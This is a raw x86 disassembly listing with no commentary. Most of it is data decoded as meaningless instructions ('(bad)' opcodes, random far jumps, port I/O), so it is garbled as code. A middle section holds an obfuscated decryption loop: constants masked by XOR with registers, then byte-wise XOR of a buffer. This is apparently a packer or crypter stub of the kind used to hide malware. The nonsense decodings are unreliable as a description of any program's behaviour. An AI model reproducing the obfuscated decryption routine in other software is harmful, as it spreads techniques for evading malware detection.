  403a6d:	mov    eax,ds:0x34aaa485
  403a72:	mov    edx,0x1c9d5f6b
  403a77:	das    
  403a78:	sahf   
  403a79:	cmc    
  403a7a:	push   es
  403a7b:	loop   0x403a51
  403a7d:	push   ebp
  403a7e:	jg     0x403a82
  403a80:	clc    
  403a81:	push   0xd6a6430a
  403a86:	clc    
  403a87:	sbb    edi,DWORD PTR [eax+ebx*4+0x17ae1b5d]
  403a8e:	fadd   DWORD PTR [ecx]
  403a90:	idiv   esi
  403a92:	clc    
  403a93:	add    DWORD PTR [eax+0x7cfd0f90],edi
  403a99:	jns    0x403ab6
  403a9b:	mov    ah,0xc7
  403a9d:	inc    edi
  403a9e:	sub    DWORD PTR [ebx-0xdb23907],esp
  403aa4:	dec    eax
  403aa5:	mov    edi,edx
  403aa7:	sub    edi,ebp
  403aa9:	fldenv [esi+0x49be4d2e]
  403aaf:	pop    esp
  403ab0:	jecxz  0x403a47
  403ab2:	fs jo  0x403a9d
  403ab5:	add    al,0x5b
  403ab7:	(bad)  
  403ab8:	int3   
  403ab9:	pushf  
  403aba:	xchg   edx,eax
  403abb:	repnz cmp ecx,ebx
  403abe:	je     0x403af2
  403ac0:	xchg   ebp,eax
  403ac1:	ficom  DWORD PTR [edi]
  403ac3:	push   eax
  403ac4:	jne    0x403b06
  403ac6:	clc    
  403ac7:	fstp   QWORD PTR [ecx]
  403ac9:	and    bh,ah
  403acb:	and    al,0xe0
  403acd:	fcomi  st,st(3)
  403acf:	mov    esp,0x4ceb5db6
  403ad4:	jg     0x403b08
  403ad6:	ficom  WORD PTR [eax+0x58]
  403ad9:	pop    ebx
  403ada:	and    eax,0x178ad29e
  403adf:	adc    DWORD PTR [edx],edx
  403ae1:	push   0xffffffcf
  403ae3:	add    BYTE PTR [esi],dl
  403ae5:	inc    ebp
  403ae6:	ret    0x67f0
  403ae9:	dec    edi
  403aea:	sub    eax,0xca03382f
  403aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af0:	lods   al,BYTE PTR ds:[esi]
  403af1:	in     al,0x66
  403af3:	cdq    
  403af4:	xchg   edx,eax
  403af5:	scas   al,BYTE PTR es:[edi]
  403af6:	cmp    edx,DWORD PTR [edi]
  403af8:	test   eax,0x8b9528f5
  403afd:	loope  0x403aa5
  403aff:	xchg   edx,eax
  403b00:	mov    ch,0xfb
  403b02:	int3   
  403b03:	or     al,0x92
  403b05:	pusha  
  403b06:	arpl   WORD PTR [ebp-0x11d06442],bx
  403b0c:	popf   
  403b0d:	dec    edx
  403b0e:	imul   esp,DWORD PTR [edx-0x233d4a19],0x767aeaa7
  403b18:	and    bl,BYTE PTR [eax]
  403b1a:	add    esi,DWORD PTR [ebx]
  403b1c:	push   0x1b3b9403
  403b21:	out    dx,al
  403b22:	mov    ebx,0x402788b0
  403b27:	and    eax,0x99acd289
  403b2c:	pop    edi
  403b2d:	(bad)  
  403b2e:	push   ds
  403b2f:	aad    0x37
  403b31:	je     0x403b6c
  403b33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b34:	stos   BYTE PTR es:[edi],al
  403b35:	or     bh,BYTE PTR [ebp+esi*8+0x1e]
  403b39:	(bad)  
  403b3a:	les    eax,FWORD PTR [ebp+0x2c86f2eb]
  403b40:	or     DWORD PTR [esi],edi
  403b42:	aas    
  403b43:	fild   WORD PTR [eax+ebp*8-0x30]
  403b47:	out    dx,al
  403b48:	and    BYTE PTR [eax+0x9cd2fb4],0xdc
  403b4f:	mov    edx,ds
  403b51:	or     ecx,DWORD PTR [ebx]
  403b53:	lea    ebx,[edi+0x613bf2ea]
  403b59:	push   esp
  403b5a:	lods   eax,DWORD PTR ds:[esi]
  403b5b:	call   0x72066587
  403b60:	xchg   edi,eax
  403b61:	add    BYTE PTR [ebx-0x64],bl
  403b64:	int    0xbb
  403b66:	cmp    al,0x35
  403b68:	adc    al,0xe
  403b6a:	call   0x6aa68b5b
  403b6f:	xchg   BYTE PTR [ecx+0x77],cl
  403b72:	mov    eax,ds:0xb1a5b747
  403b77:	add    al,0x74
  403b79:	xor    BYTE PTR [edi+0x3d],dh
  403b7c:	xor    al,0x30
  403b7e:	clc    
  403b7f:	cmp    ah,bl
  403b81:	repnz sbb DWORD PTR [esi],ebp
  403b84:	sbb    DWORD PTR [edx-0x74],esp
  403b87:	xchg   ebp,eax
  403b88:	push   esi
  403b89:	ins    DWORD PTR es:[edi],dx
  403b8a:	cmp    BYTE PTR [esp+edx*8],bl
  403b8d:	pop    ebp
  403b8e:	ins    DWORD PTR es:[edi],dx
  403b8f:	icebp  
  403b90:	xor    eax,0xeb449da9
  403b95:	sbb    BYTE PTR [ebx+0x3f],bh
  403b98:	add    DWORD PTR [eax+0x25],0xffffff99
  403b9c:	push   eax
  403b9d:	sub    ebp,esp
  403b9f:	mov    ebp,0x22fa44f4
  403ba4:	jmp    0xb60c:0xf530706f
  403bab:	iret   
  403bac:	mov    ds,WORD PTR [eax+eax*2]
  403baf:	aad    0x7a
  403bb1:	(bad)  
  403bb2:	sbb    BYTE PTR [ebx+0x5cf54634],dl
  403bb8:	cmc    
  403bb9:	aam    0x4b
  403bbb:	cmp    DWORD PTR [edx-0x38753c8f],ebx
  403bc1:	mov    ch,0xfc
  403bc3:	and    ah,BYTE PTR ds:[eax]
  403bc6:	cmp    BYTE PTR [ebx+esi*1],0x7f
  403bca:	inc    ebx
  403bcb:	ja     0x403b6d
  403bcd:	adc    cl,BYTE PTR [edx]
  403bcf:	arpl   WORD PTR [ebp-0xe4e4c5b],si
  403bd5:	int3   
  403bd6:	fidivr WORD PTR [edx+0xba5aee7]
  403bdc:	jl     0x403b80
  403bde:	call   0x206dac1f
  403be3:	out    dx,al
  403be4:	in     eax,dx
  403be5:	and    DWORD PTR [edi-0x31],ebp
  403be8:	push   cs
  403be9:	js     0x403bb2
  403beb:	outs   dx,BYTE PTR ds:[esi]
  403bec:	sub    ebx,DWORD PTR [esp+ebp*8-0x4f5d8bfa]
  403bf3:	xchg   ebx,eax
  403bf4:	leave  
  403bf5:	mov    cx,0xba8e
  403bf9:	sbb    BYTE PTR [eax+0x552c25a7],al
  403bff:	pop    ebx
  403c00:	xchg   ebx,eax
  403c01:	test   eax,0x98a3cff3
  403c06:	dec    esp
  403c07:	mov    DWORD PTR [edi+edx*2-0x15],esi
  403c0b:	out    dx,eax
  403c0c:	push   0x48
  403c0e:	push   ecx
  403c0f:	cwde   
  403c10:	xor    eax,0x73fcf4e
  403c15:	iret   
  403c16:	or     eax,0x352b2aeb
  403c1b:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  403c22:	mov    eax,DWORD PTR [ebp-0x38]
  403c25:	mov    edx,DWORD PTR [ebp-0x14]
  403c28:	xor    eax,esi
  403c2a:	add    eax,edi
  403c2c:	cmp    edx,eax
  403c2e:	je     0x40617c
  403c34:	mov    eax,DWORD PTR [ebp-0x20]
  403c37:	xor    eax,esi
  403c39:	mov    edx,0xffcd8d0b
  403c3e:	sub    edx,eax
  403c40:	add    edx,DWORD PTR [ebp-0x14]
  403c43:	mov    eax,DWORD PTR [ebp-0x20]
  403c46:	mov    ebx,DWORD PTR [ebp-0x10]
  403c49:	xor    eax,esi
  403c4b:	add    eax,edi
  403c4d:	imul   eax,ebx
  403c50:	cmp    eax,edx
  403c52:	ja     0x406179
  403c58:	mov    edx,DWORD PTR [ebp-0x10]
  403c5b:	mov    eax,DWORD PTR [ebp-0x14]
  403c5e:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c61:	sub    eax,edx
  403c63:	xor    ebx,esi
  403c65:	xor    edx,edx
  403c67:	add    ebx,edi
  403c69:	div    ebx
  403c6b:	mov    DWORD PTR [ebp-0x8],eax
  403c6e:	mov    eax,DWORD PTR [ebp-0x44]
  403c71:	mov    edx,DWORD PTR [ebp-0x8]
  403c74:	xor    eax,esi
  403c76:	add    eax,edi
  403c78:	cmp    edx,eax
  403c7a:	jbe    0x403c8a
  403c80:	mov    eax,DWORD PTR [ebp-0x44]
  403c83:	xor    eax,esi
  403c85:	add    eax,edi
  403c87:	mov    DWORD PTR [ebp-0x8],eax
  403c8a:	mov    eax,DWORD PTR [ebp-0x2c]
  403c8d:	mov    edx,DWORD PTR [ebp-0x8]
  403c90:	xor    eax,esi
  403c92:	add    eax,edi
  403c94:	imul   eax,edx
  403c97:	mov    DWORD PTR [ebp-0x8],eax
  403c9a:	mov    eax,DWORD PTR [ebp-0x38]
  403c9d:	mov    edx,DWORD PTR [ebp-0x8]
  403ca0:	xor    eax,esi
  403ca2:	add    eax,edi
  403ca4:	cmp    edx,eax
  403ca6:	je     0x406162
  403cac:	mov    eax,DWORD PTR [ebp-0x8]
  403caf:	mov    DWORD PTR [ebp-0x18],eax
  403cb2:	mov    eax,DWORD PTR [ebp-0x10]
  403cb5:	add    eax,DWORD PTR [ebp-0x54]
  403cb8:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403cbf:	mov    DWORD PTR [ebp-0x8],eax
  403cc2:	mov    eax,0xf89c85a2
  403cc7:	mov    DWORD PTR [ebp-0x28],eax
  403cca:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cd1:	mov    DWORD PTR [ebp-0x40],0xf89c85a0
  403cd8:	mov    DWORD PTR [ebp-0x30],eax
  403cdb:	mov    eax,DWORD PTR [ebp-0x1c]
  403cde:	xor    eax,esi
  403ce0:	add    eax,edi
  403ce2:	jmp    0x40611e
  403ce7:	mov    DWORD PTR [ebp-0x4c],0xf89c85b8
  403cee:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cf5:	mov    eax,DWORD PTR [ebp-0x30]
  403cf8:	mov    edx,DWORD PTR [ebp-0xc]
  403cfb:	xor    eax,esi
  403cfd:	add    eax,edi
  403cff:	imul   eax,edx
  403d02:	mov    edx,DWORD PTR [ebp-0x8]
  403d05:	mov    al,BYTE PTR [eax+edx*1]
  403d08:	mov    BYTE PTR [ebp-0x1],al
  403d0b:	mov    eax,DWORD PTR [ebp-0x30]
  403d0e:	mov    edx,DWORD PTR [ebp-0xc]
  403d11:	xor    eax,esi
  403d13:	add    eax,edi
  403d15:	imul   eax,edx
  403d18:	mov    edx,DWORD PTR [ebp-0x5c]
  403d1b:	xor    edx,esi
  403d1d:	add    eax,edx
  403d1f:	mov    edx,DWORD PTR [ebp-0x8]
  403d22:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d2a:	mov    edx,DWORD PTR [ebp-0x4c]
  403d2d:	xor    edx,esi
  403d2f:	lea    eax,[edx+eax*1+0x3272f5]
  403d36:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3a:	xor    edx,eax
  403d3c:	mov    BYTE PTR [ebp-0x1],dl
  403d3f:	mov    al,BYTE PTR [ebp-0x1]
  403d42:	mov    edx,DWORD PTR [ebp-0x30]
  403d45:	mov    ebx,DWORD PTR [ebp-0xc]
  403d48:	xor    edx,esi
  403d4a:	add    edx,edi
  403d4c:	imul   edx,ebx
  403d4f:	mov    ebx,DWORD PTR [ebp-0x8]
  403d52:	mov    BYTE PTR [edx+ebx*1],al
  403d55:	mov    eax,DWORD PTR [ebp-0x30]
  403d58:	mov    edx,DWORD PTR [ebp-0xc]
  403d5b:	xor    eax,esi
  403d5d:	add    eax,edi
  403d5f:	imul   eax,edx
  403d62:	mov    edx,DWORD PTR [ebp-0x8]
  403d65:	mov    al,BYTE PTR [eax+edx*1]
  403d68:	mov    BYTE PTR [ebp-0x1],al
  403d6b:	mov    eax,DWORD PTR [ebp-0x30]
  403d6e:	mov    edx,DWORD PTR [ebp-0xc]
  403d71:	xor    eax,esi
  403d73:	add    eax,edi
  403d75:	imul   eax,edx
  403d78:	mov    edx,DWORD PTR [ebp-0x28]
  403d7b:	xor    edx,esi
  403d7d:	add    eax,edx
  403d7f:	mov    edx,DWORD PTR [ebp-0x8]
  403d82:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d8a:	mov    edx,DWORD PTR [ebp-0x50]
  403d8d:	xor    edx,esi
  403d8f:	lea    eax,[edx+eax*1+0x3272f5]
  403d96:	movzx  edx,BYTE PTR [ebp-0x1]
  403d9a:	xor    edx,eax
  403d9c:	mov    BYTE PTR [ebp-0x1],dl
  403d9f:	mov    al,BYTE PTR [ebp-0x1]
  403da2:	mov    edx,DWORD PTR [ebp-0x30]
  403da5:	mov    ebx,DWORD PTR [ebp-0xc]
  403da8:	xor    edx,esi
  403daa:	add    edx,edi
  403dac:	imul   edx,ebx
  403daf:	mov    ebx,DWORD PTR [ebp-0x8]
  403db2:	jmp    0x406107
  403db7:	dec    ebx
  403db8:	inc    eax
  403db9:	sub    eax,0xc4820296
  403dbe:	scas   al,BYTE PTR es:[edi]
  403dbf:	push   0xf0dd8915
  403dc4:	arpl   WORD PTR [ebp-0x7ca1b475],cx
  403dca:	or     DWORD PTR [ebx+0x5e],0xffffff83
  403dce:	and    edi,0x77
  403dd1:	adc    DWORD PTR [ebp*1-0x6843a249],0xf30164a9
  403ddc:	leave  
  403ddd:	xchg   ecx,eax
  403dde:	inc    ebp
  403ddf:	dec    edi
  403de0:	and    esp,eax
  403de2:	cli    
  403de3:	push   ss
  403de4:	jno    0x403e42
  403de6:	cld    
  403de7:	bound  edi,QWORD PTR [edx-0x21]
  403dea:	imul   esp,DWORD PTR ds:0xce6588b9,0x6b4e8f78
  403df4:	xor    BYTE PTR [eax+0x5d],0x6f
  403df8:	retf   0xee73
  403dfb:	lahf   
  403dfc:	add    ebx,DWORD PTR [edi+ebp*4]
  403dff:	addr16 (bad) 
  403e01:	sti    
  403e02:	(bad)  
  403e03:	lahf   
  403e04:	adc    ch,BYTE PTR [ecx]
  403e06:	stos   DWORD PTR es:[edi],eax
  403e07:	mov    al,0xf
  403e09:	dec    ebx
  403e0a:	dec    eax
  403e0b:	or     bl,BYTE PTR [ebx+eiz*2+0x41]
  403e0f:	jge    0x403e75
  403e11:	cmp    esi,eax
  403e13:	xchg   edx,eax
  403e14:	or     BYTE PTR [edi-0x13],cl
  403e17:	mov    ds:0x5a6eb20b,eax
  403e1c:	loope  0x403dcd
  403e1e:	dec    ebx
  403e1f:	pop    ds
  403e20:	xlat   BYTE PTR ds:[ebx]
  403e21:	mov    dh,0x31
  403e23:	sti    
  403e24:	lods   al,BYTE PTR ds:[esi]
  403e25:	jno    0x403db9
  403e27:	cwde   
  403e28:	and    eax,0xa9dd8efc
  403e2d:	mov    bl,0xe3
  403e2f:	les    ebx,FWORD PTR [ecx+0x11]
  403e32:	ins    BYTE PTR es:[edi],dx
  403e33:	inc    ebx
  403e34:	out    0x17,eax
  403e36:	sbb    ah,BYTE PTR [ecx+0x7e]
  403e39:	or     BYTE PTR [edx-0x7305176c],ch
  403e3f:	xchg   esp,eax
  403e40:	inc    ebp
  403e41:	adc    BYTE PTR [esi],dh
  403e43:	xchg   esp,eax
  403e44:	xchg   esp,eax
  403e45:	jo     0x403df5
  403e47:	sub    DWORD PTR [eax-0x23],0xfe19237c
  403e4e:	into   
  403e4f:	aas    
  403e50:	or     cl,BYTE PTR [ebx]
  403e52:	pop    edi
  403e53:	int    0x23
  403e55:	fsub   QWORD PTR [edx+0x3b2ad157]
  403e5b:	pushf  
  403e5c:	lahf   
  403e5d:	outs   dx,DWORD PTR ds:[esi]
  403e5e:	mov    ebx,0xc5f6efd
  403e63:	mov    eax,ds:0x9388435a
  403e68:	daa    
  403e69:	es aam 0x9d
  403e6c:	cmp    eax,0x7dbe0ba
  403e71:	xchg   ebx,eax
  403e72:	mov    ebx,0xcf04e172
  403e77:	ret    
  403e78:	loop   0x403ef0
  403e7a:	xchg   DWORD PTR [esi-0xd],eax
  403e7d:	or     DWORD PTR [esi],esi
  403e7f:	pushf  
  403e80:	icebp  
  403e81:	push   0x11
  403e83:	mov    eax,DWORD PTR [esi-0x122d243a]
  403e89:	jb     0x403ec4
  403e8b:	lods   eax,DWORD PTR ds:[esi]
  403e8c:	repnz push es
  403e8e:	pop    eax
  403e8f:	xor    BYTE PTR [ecx],al
  403e91:	jno    0x88ae68dd
  403e97:	test   eax,0x10c34b17
  403e9c:	jmp    0x2736:0x58dc9e27
  403ea3:	mov    ah,0xff
  403ea5:	fld    TBYTE PTR [ebx]
  403ea7:	je     0x403ee7
  403ea9:	jg     0x403e60
  403eab:	int    0x5d
  403ead:	dec    ecx
  403eae:	jle    0x403e49
  403eb0:	cdq    
  403eb1:	leave  
  403eb2:	xchg   ebp,eax
  403eb3:	and    dh,bh
  403eb5:	lods   eax,DWORD PTR ds:[esi]
  403eb6:	es repz push esi
  403eb9:	mov    esi,0x6655560e
  403ebe:	push   0x1881a850
  403ec3:	mov    al,ds:0x28f71c0e
  403ec8:	pop    eax
  403ec9:	mov    edi,0x41fe6c19
  403ece:	in     al,0xe3
  403ed0:	jae    0x403f31
  403ed2:	push   0xffffffcc
  403ed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed5:	sub    DWORD PTR [esi+edx*1+0x79],edi
  403ed9:	mov    eax,ds:0x69fa0976
  403ede:	jo     0x403f03
  403ee0:	(bad)  
  403ee1:	outs   dx,DWORD PTR ds:[esi]
  403ee2:	sub    BYTE PTR [ebx-0x698d7532],bl
  403ee8:	jns    0x403e72
  403eea:	jns    0x403e9c
  403eec:	dec    ecx
  403eed:	cs loop 0x403efb
  403ef0:	(bad)  
  403ef1:	repz inc ebp
  403ef3:	adc    eax,0xa6d64bfd
  403ef8:	imul   esi,esp,0x4f
  403efb:	imul   esi,DWORD PTR [ebx+0x37b0cb5a],0xc575d1
  403f05:	dec    edx
  403f06:	es scas eax,DWORD PTR es:[edi]
  403f08:	test   al,0xe0
  403f0a:	pop    ecx
  403f0b:	pop    es
  403f0c:	cmp    eax,0xfad743f2
  403f11:	(bad)  
  403f14:	adc    eax,0xa795a9f2
  403f19:	sbb    ecx,eax
  403f1b:	jmp    0xeafd:0xf1edf0e1
  403f22:	in     eax,dx
  403f23:	inc    ebp
  403f24:	in     eax,0x52
  403f26:	js     0x403f44
  403f28:	and    al,0xbf
  403f2a:	jne    0x403f47
  403f2c:	fstp   QWORD PTR [esi]
  403f2e:	dec    edx
  403f2f:	cmp    ebx,DWORD PTR ds:0x10c4b6a3
  403f35:	test   BYTE PTR [ecx+0x18bed1c6],0xf1
  403f3c:	mov    esp,0xea931e64
  403f41:	jl     0x403f2e
  403f43:	icebp  
  403f44:	les    edx,FWORD PTR [ecx+0x42]
  403f47:	iret   
  403f48:	jl     0x403ecd
  403f4a:	test   DWORD PTR [ebx-0x9f78d3c],edi
  403f50:	out    dx,al
  403f51:	mov    dl,BYTE PTR [ebp+0x53424c63]
  403f57:	addr16 mov dl,0xa2
  403f5a:	cmc    
  403f5b:	jmp    0x15227407
  403f60:	xor    ah,BYTE PTR [ecx+0x11885031]
  403f66:	xchg   ebp,eax
  403f67:	jns    0x403f25
  403f69:	sub    esp,DWORD PTR [ebx+0x729f3576]
  403f6f:	pop    ebp
  403f70:	xor    esp,DWORD PTR [eax-0x3]
  403f73:	jge    0x403f6d
  403f75:	xchg   BYTE PTR [esi-0x6a],cl
  403f78:	jno    0x403fce
  403f7a:	outs   dx,DWORD PTR ds:[esi]
  403f7b:	push   ebp
  403f7c:	(bad)  
  403f7d:	mov    al,ds:0x3ae45298
  403f83:	xor    ecx,DWORD PTR [eax]
  403f85:	mov    ah,0x80
  403f87:	dec    edi
  403f88:	lods   eax,DWORD PTR ds:[esi]
  403f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f8a:	sub    eax,0xf1b09934
  403f8f:	cmp    eax,0x25632823
  403f94:	jg     0x403f34
  403f96:	lods   eax,DWORD PTR ds:[esi]
  403f97:	push   DWORD PTR [ebp-0x4e4f4393]
  403f9d:	bnd jno 0x403fcb
  403fa0:	inc    eax
  403fa1:	pop    edi
  403fa2:	xor    BYTE PTR [ecx-0x3321821e],0x4b
  403fa9:	mov    ecx,0x282cd64d
  403fae:	dec    esp
  403faf:	ret    
  403fb0:	cs enter 0x629,0xef
  403fb5:	test   DWORD PTR [ebp+0x32b085ed],edx
  403fbb:	icebp  
  403fbc:	shr    BYTE PTR [ecx+0x5d],0x64
  403fc0:	xchg   ebx,eax
  403fc1:	in     al,dx
  403fc2:	int3   
  403fc3:	jne    0x403f74
  403fc5:	jb     0x403fdc
  403fc7:	and    eax,0x8f00ed9e
  403fcc:	add    edi,0xf543dbaf
  403fd2:	(bad)  
  403fd3:	adc    esp,edi
  403fd5:	jmp    FWORD PTR [eax+0x4a]
  403fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd9:	mov    bh,0x11
  403fdb:	inc    edi
  403fdc:	adc    eax,esi
  403fde:	mov    al,0x69
  403fe0:	int    0xc5
  403fe2:	psrad  mm4,QWORD PTR [ebx]
  403fe5:	adc    DWORD PTR [ebx],esi
  403fe7:	pop    ebx
  403fe8:	jge    0x404031
  403fea:	mov    ch,cl
  403fec:	inc    esp
  403fee:	fcmovnbe st,st(6)
  403ff0:	pop    ecx
  403ff1:	in     eax,0xa
  403ff3:	hlt    
  403ff4:	push   eax
  403ff5:	adc    esp,DWORD PTR [ebp-0x3f7213cc]
  403ffb:	cmp    al,0x5
  403ffd:	inc    edx
  403ffe:	or     DWORD PTR [edi-0x23f2f789],esp
  404004:	push   esi
  404005:	ds cmp al,0x9c
  404008:	cli    
  404009:	outs   dx,BYTE PTR ds:[esi]
  40400a:	nop
  40400b:	cmp    eax,0x3f6d905a
  404010:	and    BYTE PTR [ecx],bl
  404012:	sar    BYTE PTR [ebp-0x158ac85],1
  404018:	aas    
  404019:	mov    bl,0x57
  40401b:	xor    ch,al
  40401d:	fbld   TBYTE PTR [edx+0x44]
  404020:	inc    esp
  404021:	jno    0x40407a
  404023:	xchg   ebp,eax
  404024:	or     DWORD PTR [eax+0x22],ecx
  404027:	adc    BYTE PTR [ebx+ebx*8-0x1fd946ca],al
  40402e:	outs   dx,BYTE PTR ds:[esi]
  40402f:	pop    ebx
  404030:	sbb    DWORD PTR [edi],edx
  404032:	push   ebp
  404033:	jle    0x40404f
  404035:	or     BYTE PTR [edx+0x2504ba32],dl
  40403b:	xor    BYTE PTR [esi+ecx*4-0x66],ah
  40403f:	mov    ds:0x438cd43a,eax
  404044:	pop    ss
  404045:	xchg   DWORD PTR [ebp-0x1438f13f],esi
  40404b:	mov    bl,dh
  40404d:	or     bl,ch
  40404f:	sub    eax,0xad55fd1e
  404054:	dec    ebx
  404055:	xchg   esp,eax
  404056:	push   edx
  404057:	or     cl,0xf7
  40405a:	in     eax,dx
  40405b:	pushf  
  40405c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40405d:	in     eax,0x40
  40405f:	mov    esp,0xb2d96fc4
  404064:	push   ecx
  404065:	imul   ebp,DWORD PTR [ebx+0x10],0x5d3e0583
  40406c:	pop    ecx
  40406d:	cmp    cl,bh
  40406f:	std    
  404070:	mov    edi,0xbdb25024
  404075:	xchg   ebx,eax
  404076:	jae    0x404092
  404078:	dec    edx
  404079:	mov    ecx,0x1e6ea659
  40407e:	sbb    eax,0x6aea396a
  404083:	mul    dh
  404085:	dec    esp
  404086:	mov    ch,0xa0
  404088:	jl     0x404098
  40408a:	pop    ecx
  40408b:	retf   
  40408c:	pop    ecx
  40408d:	jo     0x40407b
  40408f:	mov    dh,0x53
  404091:	mov    ch,0xbd
  404093:	push   0x6ef6c112
  404098:	xchg   ebx,eax
  404099:	mov    DWORD PTR [esi+edi*4+0x11f003a2],ebp
  4040a0:	dec    ebx
  4040a1:	int    0x9f
  4040a3:	cmp    bl,BYTE PTR [ebx-0x2c750821]
  4040a9:	outs   dx,BYTE PTR ds:[esi]
  4040aa:	xchg   ebp,eax
  4040ab:	mov    ds:0x64567021,eax
  4040b0:	fwait
  4040b1:	sbb    ebx,esi
  4040b3:	ss inc edi
  4040b5:	push   ebp
  4040b6:	xchg   edi,eax
  4040b7:	sub    al,0xd0
  4040b9:	(bad)
  4040bd:	fldenv [esi+0x7e]
  4040c0:	dec    eax
  4040c1:	push   esi
  4040c2:	mov    esi,0x796d2b00
  4040c7:	cs and ah,0xb5
  4040cb:	icebp  
  4040cc:	loop   0x4040a9
  4040ce:	je     0x4040d2
  4040d0:	jl     0x4040b6
  4040d2:	mov    ds:0x55897c56,eax
  4040d7:	enter  0xa0ba,0x2d
  4040db:	mov    ebx,0x6d0909e0
  4040e0:	fisttp WORD PTR [ecx+0x6e]
  4040e3:	dec    ebp
  4040e4:	pop    ds
  4040e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040e6:	mov    cl,0x30
  4040e8:	push   ebp
  4040e9:	rol    DWORD PTR [edx-0x30],1
  4040ec:	pop    edx
  4040ed:	imul   edx,DWORD PTR [edx-0x5c],0xf570c597
  4040f4:	push   esp
  4040f5:	lods   eax,DWORD PTR ds:[esi]
  4040f6:	cdq    
  4040f7:	mov    edx,0x8aa359e5
  4040fc:	mov    dl,0x6f
  4040fe:	lahf   
  4040ff:	pop    si
  404101:	popf   
  404102:	fnstenv ds:0x83a2214c
  404108:	jns    0x404189
  40410a:	icebp  
  40410b:	fadd   st(5),st
  40410d:	pop    ds
  40410e:	xchg   ecx,eax
  40410f:	scas   eax,DWORD PTR es:[edi]
  404110:	daa    
  404111:	in     al,dx
  404112:	and    DWORD PTR [ebx+eax*8+0x11],edx
  404116:	ins    DWORD PTR es:[edi],dx
  404117:	sub    edi,0xe2e6e34
  40411d:	sbb    DWORD PTR [esi-0x68],0x9ccf6890
  404124:	mov    ?,WORD PTR [edi+0xc]
  404127:	mov    esp,0x6fd1cfa
  40412c:	shl    BYTE PTR [edx-0x601481a8],0x98
  404133:	mov    edx,0x4d7703e1
  404138:	clc    
  404139:	out    0x1,eax
  40413b:	jno    0x40410f
  40413d:	in     al,0x6c
  40413f:	sub    BYTE PTR [eax-0x59e6b83],bl
  404145:	mov    ecx,0xb888c162
  40414a:	sbb    ch,BYTE PTR [ebx-0x75]
  40414d:	test   al,0xb1
  40414f:	aas    
  404150:	in     al,0xf7
  404152:	ds clc 
  404154:	repz retf 
  404156:	sbb    eax,0x65473ebd
  40415b:	fs ins DWORD PTR es:[edi],dx
  40415d:	div    dh
  40415f:	pop    esi
  404160:	leave  
  404161:	cmp    BYTE PTR [ebp+ebp*2+0x6113c41a],ch
  404168:	imul   esi,DWORD PTR es:[ecx],0xffffff91
  40416c:	xlat   BYTE PTR ds:[ebx]
  40416d:	and    eax,0x3c68eb2f
  404172:	mov    cl,0x8f
  404174:	adc    cl,BYTE PTR [esi]
  404176:	sti    
  404177:	js     0x404181
  404179:	mov    DWORD PTR cs:[edi+0x2d],esi
  40417d:	stc    
  40417e:	adc    al,0xc3
  404180:	inc    esi
  404181:	leave  
  404182:	stc    
  404183:	cdq    
  404184:	pop    edx
  404185:	fstp   QWORD PTR [esi+0x39cd629]
  40418b:	in     eax,dx
  40418c:	mov    ecx,?
  40418e:	lds    ebx,FWORD PTR [eax-0x7eb79bec]
  404194:	(bad)  
  404195:	in     eax,0x35
  404197:	sub    ebp,DWORD PTR [ebx-0x31]
  40419a:	and    al,0x4e
  40419c:	xchg   edi,eax
  40419d:	mul    ch
  40419f:	and    cl,bh
  4041a1:	ja     0x4041db
  4041a3:	jns    0x4041e5
  4041a5:	fst    DWORD PTR [ecx-0x6755326]
  4041ab:	dec    ebx
  4041ac:	iret   
  4041ad:	pusha  
  4041ae:	outs   dx,DWORD PTR ds:[esi]
  4041af:	int    0x77
  4041b1:	(bad)  
  4041b2:	pop    ecx
  4041b3:	push   ss
  4041b4:	xchg   ebx,eax
  4041b5:	xor    DWORD PTR [eax+0xa],eax
  4041b8:	out    0xdf,eax
  4041ba:	pop    es
  4041bb:	mov    bh,0x66
  4041bd:	xchg   esp,ebp
  4041bf:	sub    eax,0x62266a74
  4041c4:	in     al,0x1a
  4041c6:	xchg   BYTE PTR [eax],dl
  4041c8:	inc    esi
  4041c9:	rcl    BYTE PTR [esi],0x9
  4041cc:	push   0xe8c1af7e
  4041d1:	cmp    al,BYTE PTR [edx+ebx*4+0x5]
  4041d5:	inc    esi
  4041d6:	btc    DWORD PTR [edx+0x29],ebp
  4041da:	pop    es
  4041db:	ins    BYTE PTR es:[edi],dx
  4041dc:	pop    es
  4041dd:	or     ebx,eax
  4041df:	(bad)  
  4041e0:	sub    DWORD PTR [ebx],esi
  4041e2:	daa    
  4041e3:	or     bl,ch
  4041e5:	dec    eax
  4041e6:	and    ah,BYTE PTR [ebx+ecx*2]
  4041e9:	jg     0x404216
  4041eb:	cmp    BYTE PTR [eax-0x1d64c564],ah
  4041f1:	push   edi
  4041f2:	test   BYTE PTR [edx+0x6d],bl
  4041f5:	nop
  4041f6:	push   0xe44799df
  4041fb:	js     0x404208
  4041fd:	cli    
  4041fe:	jmp    0x52940de6
  404203:	pop    edx
  404204:	or     eax,0xa178970f
  404209:	or     al,0x3
  40420b:	popf   
  40420c:	or     eax,0x5139a158
  404211:	call   0x6e53d234
  404216:	out    dx,al
  404217:	or     eax,edx
  404219:	ret    0x45e6
  40421c:	and    ecx,ebp
  40421e:	mov    BYTE PTR [ecx],ch
  404220:	dec    eax
  404221:	push   ebp
  404222:	hlt    
  404223:	xchg   esi,edx
  404225:	(bad)  [esi]
  404227:	iret   
  404228:	ficom  DWORD PTR [eax+0x15]
  40422b:	or     bl,bl
  40422d:	or     al,0x7a
  40422f:	mov    eax,ds:0x5510aaff
  404234:	jbe    0x4041c5
  404236:	lods   al,BYTE PTR ds:[esi]
  404237:	mov    bl,0x41
  404239:	sbb    DWORD PTR [ebp-0x21459ae5],esp
  40423f:	cmc    
  404240:	rcr    ebx,1
